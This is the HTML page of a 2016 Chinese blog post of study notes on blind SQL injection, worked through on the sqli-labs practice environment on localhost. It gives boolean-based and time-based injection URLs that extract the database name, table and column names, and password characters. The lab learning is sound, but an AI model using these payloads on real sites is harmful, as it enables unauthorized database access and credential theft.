@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
+  <title>sql盲注学习笔记 | 春风十里</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="sql盲注　　在刚接触sql注入的时候还不太清楚sql盲注是什么，很多东西都要自己去体会才能知道到底是什么样子的。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql盲注学习笔记">
+<meta property="og:url" content="http://byd.dropsec.xyz/2016/09/22/sql盲注学习笔记/index.html">
+<meta property="og:site_name" content="春风十里">
+<meta property="og:description" content="sql盲注　　在刚接触sql注入的时候还不太清楚sql盲注是什么，很多东西都要自己去体会才能知道到底是什么样子的。">
+<meta property="og:image" content="http://i2.buimg.com/567571/adbcf6108d98a116.png">
+<meta property="og:image" content="http://i2.buimg.com/567571/0734542cbac67246.png">
+<meta property="og:image" content="http://i2.buimg.com/567571/dc1637ce49349e12.png">
+<meta property="og:image" content="http://i2.buimg.com/567571/d4cfd4d6aacac9bf.png">
+<meta property="og:image" content="http://i2.buimg.com/567571/4fc7359cac8331a2.png">
+<meta property="og:image" content="http://i2.buimg.com/567571/3df977775740cbf4.png">
+<meta property="og:updated_time" content="2016-09-22T07:58:25.769Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sql盲注学习笔记">
+<meta name="twitter:description" content="sql盲注　　在刚接触sql注入的时候还不太清楚sql盲注是什么，很多东西都要自己去体会才能知道到底是什么样子的。">
+<meta name="twitter:image" content="http://i2.buimg.com/567571/adbcf6108d98a116.png">
+  
+    <link rel="alternative" href="/atom.xml" title="春风十里" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="//favicon.png">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img src="//clearloveqaq.github.io/img/111.png" class="js-avatar" style="width: 100%;height: 100%;opacity: 1;">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/">zp</a></h1>
+		</hgroup>
+
+		
+		<p class="header-subtitle">春风十里 不如做题</p>
+		
+
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主页</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+								<a class="github" target="_blank" href="https://github.com/clearloveQAQ" title="github">github</a>
+					        
+								<a class="weibo" target="_blank" href="http://weibo.com/3262993654/profile?rightmod=1&wvr=6&mod=personinfo&is_all=1" title="weibo">weibo</a>
+					        
+								<a class="mail" target="_blank" href="https://mail.qq.com/cgi-bin/frame_html?sid=mNwN2kOtKnfYdjpt&r=745214a32ef2dee5dd3d9b17d5d30fd0" title="mail">mail</a>
+					        
+						</div>
+					</nav>
+				</section>
+				
+				
+				
+				
+
+				
+			</div>
+		</div>
+	</header>				
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide">zp</h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				
+					<img src="//clearloveqaq.github.io/img/111.png" class="js-avatar" style="width: 100%;height: 100%;opacity: 1;">
+				
+			</div>
+			<hgroup>
+			  <h1 class="header-author">zp</h1>
+			</hgroup>
+			
+			<p class="header-subtitle">春风十里 不如做题</p>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="github" target="_blank" href="https://github.com/clearloveQAQ" title="github">github</a>
+			        
+						<a class="weibo" target="_blank" href="http://weibo.com/3262993654/profile?rightmod=1&wvr=6&mod=personinfo&is_all=1" title="weibo">weibo</a>
+			        
+						<a class="mail" target="_blank" href="https://mail.qq.com/cgi-bin/frame_html?sid=mNwN2kOtKnfYdjpt&r=745214a32ef2dee5dd3d9b17d5d30fd0" title="mail">mail</a>
+			        
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+
+      <div class="body-wrap"><article id="post-sql盲注学习笔记" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/09/22/sql盲注学习笔记/" class="article-date">
+  	<time datetime="2016-09-22T01:52:17.000Z" itemprop="datePublished">2016-09-22</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      sql盲注学习笔记
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+        
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="sql盲注"><a href="#sql盲注" class="headerlink" title="sql盲注"></a>sql盲注</h1><p>　　在刚接触sql注入的时候还不太清楚sql盲注是什么，很多东西都要自己<br>去体会才能知道到底是什么样子的。<br><a id="more"></a></p>
+<h2 id="sql注入之盲注"><a href="#sql注入之盲注" class="headerlink" title="sql注入之盲注"></a>sql注入之盲注</h2><p>　　盲注其实是sql注入的一种，之所以称为盲注是因为他不会根据你sql注入的攻击语句返回你想要知道的错误信息。<br>　　盲注分为两类：<br>   　　　　1.布尔盲注　布尔很明显Ture跟Fales，也就是说它只会根据　　　　你的注入信息返回Ture跟Fales，也就没有了之前的报错信息。<br>　　　　2.时间盲注　界面返回值只有一种,true 无论输入任何值 返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。<br>　　需要用到的函数：</p>
+<pre><code>Length（）函数 返回字符串的长度
+Substr（）截取字符串
+Ascii（）返回字符的ascii码
+sleep(n)：将程序挂起一段时间 n为n秒
+if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句
+</code></pre><p>　　先在mysql里测试下这几个函数：<br>　　　　这里使用的是security库<br>length函数：<br><img src="http://i2.buimg.com/567571/adbcf6108d98a116.png" alt=""><br>substr函数：<br><img src="http://i2.buimg.com/567571/0734542cbac67246.png" alt=""><br>Ascii：<br><img src="http://i2.buimg.com/567571/dc1637ce49349e12.png" alt=""><br>sleep跟if由于是时间盲注就不一一测试了。</p>
+<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>sqli-less-8为布尔盲注这里就用它做下测试<br>　　刚开始用id=1’/  ’)  “ 测试了一下发现不会爆出错误信息 只有正确跟错误 less-8应该就是布尔盲注了吧  然后通过上面的函数首先构造一个猜测数据库名长度的函数</p>
+<pre><code>http://127.0.0.1/Less-8/?id=1&apos;and (length(database()))&gt;10 --+
+</code></pre><p><img src="http://i2.buimg.com/567571/d4cfd4d6aacac9bf.png" alt=""><br>返回错误 说明length小于10<br>然后继续猜测是不是大于5</p>
+<pre><code>http://127.0.0.1/Less-8/?id=1&apos; and (length(database()))&gt;5 --+
+</code></pre><p><img src="http://i2.buimg.com/567571/4fc7359cac8331a2.png" alt=""><br>返回正确说明长度大于5小于10<br>最后得到结果为</p>
+<pre><code>http://127.0.0.1/Less-8/?id=1&apos; and (length(database()))=8 --+
+</code></pre><p><img src="http://i2.buimg.com/567571/3df977775740cbf4.png" alt=""><br>返回正确 长度为八 也就是security<br>接下来利用substr函数与ascii函数构造猜测数据库名ascii码的值的语句 因为现在只知道长度不知道具体内容<br>构造语句如下</p>
+<pre><code>http://127.0.0.1/Less-8/?id=1&apos; and (ascii(substr(database(),1,1)))&gt;100 --+
+</code></pre><p>返回正确说明第一个字母的ascii码大于100</p>
+<pre><code>http://127.0.0.1/Less-8/?id=1&apos; and (ascii(substr(database(),1,1)))&gt;110 --+
+</code></pre><p>返回正确 </p>
+<pre><code>http://127.0.0.1/Less-8/?id=1&apos; and (ascii(substr(database(),1,1)))&lt;120 --+
+</code></pre><p>返回正确</p>
+<pre><code>http://127.0.0.1/Less-8/?id=1&apos; and (ascii(substr(database(),1,1)))&lt;115 --+
+</code></pre><p>返回错误</p>
+<pre><code>http://127.0.0.1/Less-8/?id=1&apos; and (ascii(substr(database(),1,1)))=115 --+
+</code></pre><p>返回正确 通过查ascii码表可知 ascii（115）=s 也就是security 的第一个字母<br>通过改变database（）后面的数字 可以继续猜测第二个字母第三个字母<br>接下来改变语句去猜测表名<br>构造这个语句的时候发现自己还是不够熟练 弄错了好几次</p>
+<pre><code>http://127.0.0.1/Less-8/?id=1&apos; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;100 --+
+</code></pre><p>返回正确 当等于101的时候返回正确 101为 e 查看mysql 得知第一个表为emails 正确结果 </p>
+<pre><code>http://127.0.0.1/Less-8/?id=1&apos; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))=114 --+
+</code></pre><p>猜测列名只需要改变几个地方</p>
+<pre><code>http://127.0.0.1/Less-8/?id=1&apos; and (ascii(substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),1,1)))&gt;100 --+
+</code></pre><p>获取user表的内容 经过猜测 ascii为 105  为i  也就是表的第一个列名 id的第一个字母 同样 通过修改 limit 0,1 获取第二个列名 修改后面1,1的获取当前列的其他字段<br>接着获取 username 与 password 里面的内容 因为知道了列名所以直接 select password from users 就可以获取password里面的内容 username一样<br>具体语句如下</p>
+<pre><code>http://127.0.0.1/Less-8/?id=1&apos; and (ascii(substr(( select password from users limit 0,1),1,1)))=68--+  
+</code></pre><p>ascii(68)=D  正确<br>手工盲注很繁琐 需要一个一个的试 不过现在还是先学习手工理解了sql注入的原理再去用工具比较好</p>
+<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>sqli-less-9为时间盲注<br>前面已经说过slee（）函数跟if函数了<br>这里就直接构造如下语句</p>
+<pre><code>http://127.0.0.1/Less-9/?id=1&apos; and (if(ascii(substr(database(),1,1))&gt;100,sleep(10),null))  --+ 
+</code></pre><p>如果返回正确则 页面会停顿10秒，返回错误则会立马返回<br>其他与布尔盲注都是差不多的</p>
+<h3 id="post类的布尔盲注与时间盲注"><a href="#post类的布尔盲注与时间盲注" class="headerlink" title="post类的布尔盲注与时间盲注"></a>post类的布尔盲注与时间盲注</h3><p>　　前面说的都是get类的盲注，post类的布尔盲注只是把and换成or其他不变，时间盲注有些不同因为在post类里sleep函数会被放大很多也就是说那个延时时间会很长，不过并不影响我们进行测试。</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2016/09/12/drops安全杂项/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">drops安全杂项</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+
+
+<div class="duoshuo">
+	<!-- 多说评论框 start -->
+	<div class="ds-thread" data-thread-key="sql盲注学习笔记" data-title="sql盲注学习笔记" data-url="http://byd.dropsec.xyz/2016/09/22/sql盲注学习笔记/"></div>
+	<!-- 多说评论框 end -->
+	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+	<script type="text/javascript">
+	var duoshuoQuery = {short_name:"clearloveQAQ"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0] 
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+	</script>
+	<!-- 多说公共JS代码 end -->
+</div>
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+    	<div class="footer-left">
+    		&copy; 2016 zp
+    	</div>
+      	<div class="footer-right">
+      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
+      	</div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: undefined,
+		animate: undefined,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: undefined,
+		root: /
+	}
+</script>
+<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script src="/js/main.js"></script>
+
+
+
+
+
+
+  </div>
+</body>
+</html>
